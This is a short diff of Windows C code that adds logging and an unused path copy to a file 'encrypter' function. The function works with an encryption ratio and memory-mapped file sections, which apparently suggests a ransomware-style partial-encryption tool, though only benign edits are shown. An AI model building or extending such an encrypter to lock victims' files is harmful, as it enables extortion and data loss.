@@ -192,7 +192,7 @@ int loadFileInMemory_test(HANDLE *fileHandle, HANDLE *sectionHandle, PVOID *loca
     // Get the file size
     LARGE_INTEGER fileSize;
     GetFileSizeEx(*fileHandle, &fileSize);
-    //printf("File size: %lld bytes\n", fileSize.QuadPart);
+    // printf("File size: %lld bytes\n", fileSize.QuadPart);
 
     // Create a section for the file
     LARGE_INTEGER sectionSize;
@@ -312,12 +312,17 @@ int key_handler(state_t key)
  */
 int encrypter(PCWSTR filePath, int encryptionRatio)
 {
+    // copying the file path to a local variable
+    const wchar_t *filePathCopy = filePath;
+
     HANDLE fileHandle = NULL;
     HANDLE sectionHandle = NULL;
     PVOID localViewAdress = NULL;
 
     uint64_t sizeOfMappedView = 0; // size of the mapped view
     uint64_t offset = 0;           // offset for the next view
+
+    printf("Encrypting file: %ls\n", filePath);
 
     // Check if file exists
     DWORD fileAttributes = GetFileAttributesW(filePath);
